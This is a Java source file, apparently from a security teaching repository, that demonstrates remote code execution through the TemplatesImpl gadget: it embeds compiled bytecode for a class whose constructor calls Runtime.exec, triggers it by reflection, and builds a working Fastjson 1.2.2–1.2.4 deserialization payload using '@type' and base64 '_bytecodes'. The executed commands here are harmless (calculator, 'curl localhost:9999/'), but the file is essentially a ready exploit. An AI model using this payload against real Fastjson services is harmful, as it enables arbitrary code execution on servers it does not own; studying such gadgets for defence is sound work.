package com.anbai.sec.classloader;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Properties;

import static org.apache.commons.codec.binary.Base64.encodeBase64String;

public class XalanTemplatesImpl {

	/**
	 * com.anbai.sec.classloader.TestAbstractTranslet类字节码
	 *
	 * <pre>
	 * package com.anbai.sec.classloader;
	 *
	 * import com.sun.org.apache.xalan.internal.xsltc.DOM;
	 * import com.sun.org.apache.xalan.internal.xsltc.TransletException;
	 * import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
	 * import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
	 * import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
	 *
	 * import java.io.IOException;
	 *
	 * public class TestAbstractTranslet extends AbstractTranslet {
	 *
	 * 	public TestAbstractTranslet() {
	 * 		String command = "open -a Calculator.app";
	 * 		String osName  = System.getProperty("os.name");
	 *
	 * 		if (osName.startsWith("Windows")) {
	 * 			command = "calc 12345678901234567";
	 *      } else if (osName.startsWith("Linux")) {
	 * 			command = "curl localhost:9999/";
	 *      }
	 *
	 * 		try {
	 * 			Runtime.getRuntime().exec(command);
	 *      } catch (IOException e) {
	 * 			e.printStackTrace();
	 *      }
	 *    }
	 *
	 *    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
	 *    }
	 *
	 *    public void transform(DOM document, DTMAxisIterator it, SerializationHandler handler) throws TransletException {
	 *    }
	 * }
	 * </pre>
	 */
	public static final byte[] CLASS_BYTES = new byte[]{
			-54, -2, -70, -66, 0, 0, 0, 50, 0, 62, 10, 0, 15, 0, 31, 8, 0, 32, 8, 0, 33, 10, 0, 34, 0, 35, 8, 0,
			36, 10, 0, 37, 0, 38, 8, 0, 39, 8, 0, 40, 8, 0, 41, 10, 0, 42, 0, 43, 10, 0, 42, 0, 44, 7, 0, 45, 10,
			0, 12, 0, 46, 7, 0, 47, 7, 0, 48, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4,
			67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1,
			0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 47, 7, 0, 49, 7, 0, 45, 1, 0,
			9, 116, 114, 97, 110, 115, 102, 111, 114, 109, 1, 0, 114, 40, 76, 99, 111, 109, 47, 115, 117, 110,
			47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101,
			114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 91, 76, 99, 111, 109, 47, 115,
			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
			101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108, 105, 122, 101, 114, 47, 83, 101, 114, 105,
			97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110, 100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 69,
			120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 50, 1, 0, -90, 40, 76, 99, 111, 109, 47, 115, 117,
			110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116,
			101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99, 47, 68, 79, 77, 59, 76, 99, 111, 109, 47, 115,
			117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 120, 109, 108, 47, 105, 110, 116,
			101, 114, 110, 97, 108, 47, 100, 116, 109, 47, 68, 84, 77, 65, 120, 105, 115, 73, 116, 101, 114, 97,
			116, 111, 114, 59, 76, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
			101, 47, 120, 109, 108, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 115, 101, 114, 105, 97, 108,
			105, 122, 101, 114, 47, 83, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 72, 97, 110,
			100, 108, 101, 114, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 25,
			84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108, 101, 116, 46, 106,
			97, 118, 97, 12, 0, 16, 0, 17, 1, 0, 22, 111, 112, 101, 110, 32, 45, 97, 32, 67, 97, 108, 99, 117,
			108, 97, 116, 111, 114, 46, 97, 112, 112, 1, 0, 7, 111, 115, 46, 110, 97, 109, 101, 7, 0, 51, 12, 0,
			52, 0, 53, 1, 0, 7, 87, 105, 110, 100, 111, 119, 115, 7, 0, 49, 12, 0, 54, 0, 55, 1, 0, 22, 99, 97,
			108, 99, 32, 49, 50, 51, 52, 53, 54, 55, 56, 57, 48, 49, 50, 51, 52, 53, 54, 55, 1, 0, 5, 76, 105,
			110, 117, 120, 1, 0, 20, 99, 117, 114, 108, 32, 108, 111, 99, 97, 108, 104, 111, 115, 116, 58, 57,
			57, 57, 57, 47, 7, 0, 56, 12, 0, 57, 0, 58, 12, 0, 59, 0, 60, 1, 0, 19, 106, 97, 118, 97, 47, 105,
			111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 12, 0, 61, 0, 17, 1, 0, 46, 99, 111,
			109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100,
			101, 114, 47, 84, 101, 115, 116, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110, 115, 108,
			101, 116, 1, 0, 64, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104,
			101, 47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116,
			99, 47, 114, 117, 110, 116, 105, 109, 101, 47, 65, 98, 115, 116, 114, 97, 99, 116, 84, 114, 97, 110,
			115, 108, 101, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110,
			103, 1, 0, 57, 99, 111, 109, 47, 115, 117, 110, 47, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101,
			47, 120, 97, 108, 97, 110, 47, 105, 110, 116, 101, 114, 110, 97, 108, 47, 120, 115, 108, 116, 99,
			47, 84, 114, 97, 110, 115, 108, 101, 116, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 16, 106,
			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 11, 103, 101, 116, 80,
			114, 111, 112, 101, 114, 116, 121, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47,
			83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114,
			105, 110, 103, 59, 1, 0, 10, 115, 116, 97, 114, 116, 115, 87, 105, 116, 104, 1, 0, 21, 40, 76, 106,
			97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 90, 1, 0, 17, 106, 97,
			118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82,
			117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82,
			117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47,
			108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110,
			103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107,
			84, 114, 97, 99, 101, 0, 33, 0, 14, 0, 15, 0, 0, 0, 0, 0, 3, 0, 1, 0, 16, 0, 17, 0, 1, 0, 18, 0, 0, 0,
			-93, 0, 2, 0, 4, 0, 0, 0, 57, 42, -73, 0, 1, 18, 2, 76, 18, 3, -72, 0, 4, 77, 44, 18, 5, -74, 0, 6,
			-103, 0, 9, 18, 7, 76, -89, 0, 15, 44, 18, 8, -74, 0, 6, -103, 0, 6, 18, 9, 76, -72, 0, 10, 43, -74,
			0, 11, 87, -89, 0, 8, 78, 45, -74, 0, 13, -79, 0, 1, 0, 40, 0, 48, 0, 51, 0, 12, 0, 2, 0, 19, 0, 0, 0,
			50, 0, 12, 0, 0, 0, 13, 0, 4, 0, 14, 0, 7, 0, 15, 0, 13, 0, 17, 0, 22, 0, 18, 0, 28, 0, 19, 0, 37, 0,
			20, 0, 40, 0, 24, 0, 48, 0, 27, 0, 51, 0, 25, 0, 52, 0, 26, 0, 56, 0, 28, 0, 20, 0, 0, 0, 24, 0, 4, -1,
			0, 28, 0, 3, 7, 0, 21, 7, 0, 22, 7, 0, 22, 0, 0, 11, 74, 7, 0, 23, 4, 0, 1, 0, 24, 0, 25, 0, 2, 0, 18, 0,
			0, 0, 25, 0, 0, 0, 3, 0, 0, 0, 1, -79, 0, 0, 0, 1, 0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 33, 0, 26, 0, 0, 0,
			4, 0, 1, 0, 27, 0, 1, 0, 24, 0, 28, 0, 2, 0, 18, 0, 0, 0, 25, 0, 0, 0, 4, 0, 0, 0, 1, -79, 0, 0, 0, 1,
			0, 19, 0, 0, 0, 6, 0, 1, 0, 0, 0, 38, 0, 26, 0, 0, 0, 4, 0, 1, 0, 27, 0, 1, 0, 29, 0, 0, 0, 2, 0, 30
	};

	/**
	 * 使用反射修改TemplatesImpl类的成员变量方式触发命令执行，Jackson和Fastjson采用这种方式触发RCE
	 *
	 * @throws Exception 调用异常
	 */
	public static void invokeField() throws Exception {
		TemplatesImpl template      = new TemplatesImpl();
		Class<?>      templateClass = template.getClass();

		// 获取需要修改的成员变量
		Field byteCodesField        = templateClass.getDeclaredField("_bytecodes");
		Field nameField             = templateClass.getDeclaredField("_name");
		Field tFactoryField         = templateClass.getDeclaredField("_tfactory");
		Field outputPropertiesField = templateClass.getDeclaredField("_outputProperties");

		// 修改成员属性访问权限
		byteCodesField.setAccessible(true);
		nameField.setAccessible(true);
		tFactoryField.setAccessible(true);
		outputPropertiesField.setAccessible(true);

		// 设置类字节码
		byteCodesField.set(template, new byte[][]{CLASS_BYTES});

		// 设置名称
		nameField.set(template, "");

		// 设置TransformerFactoryImpl实例
		tFactoryField.set(template, new TransformerFactoryImpl());

		// 设置Properties配置
		outputPropertiesField.set(template, new Properties());

		// 触发defineClass调用链：
		//   getOutputProperties->newTransformer->getTransletInstance->defineTransletClasses->defineClass
		// 触发命令执行调用链：
		//   getOutputProperties->newTransformer->getTransletInstance->new TestAbstractTranslet->Runtime#exec
		template.getOutputProperties();
	}

	/**
	 * 使用反射调用TemplatesImpl类的私有构造方法方式触发命令执行
	 *
	 * @throws Exception 调用异常
	 */
	public static void invokeConstructor() throws Exception {
		// 获取TemplatesImpl构造方法
		Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
				byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
		);

		// 修改访问权限
		constructor.setAccessible(true);

		// 创建TemplatesImpl实例
		TemplatesImpl template = constructor.newInstance(
				new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
		);

		template.getOutputProperties();
	}

	/**
	 * Fastjson 1.2.2 - 1.2.4反序列化RCE示例
	 */
	public static void fastjsonRCE() {
		// 构建恶意的JSON
		Map<String, Object> dataMap = new LinkedHashMap<String, Object>();
		dataMap.put("@type", TemplatesImpl.class.getName());
		dataMap.put("_bytecodes", new String[]{encodeBase64String(CLASS_BYTES)});
		dataMap.put("_name", "");
		dataMap.put("_tfactory", new Object());
		dataMap.put("_outputProperties", new Object());

		// 生成Payload
		String json = JSON.toJSONString(dataMap);
		System.out.println(json);

		// 使用FastJson反序列化，但必须启用SupportNonPublicField特性
		JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
	}

	public static void main(String[] args) throws Exception {
//		invokeField();
//		invokeConstructor();
		fastjsonRCE();
	}

}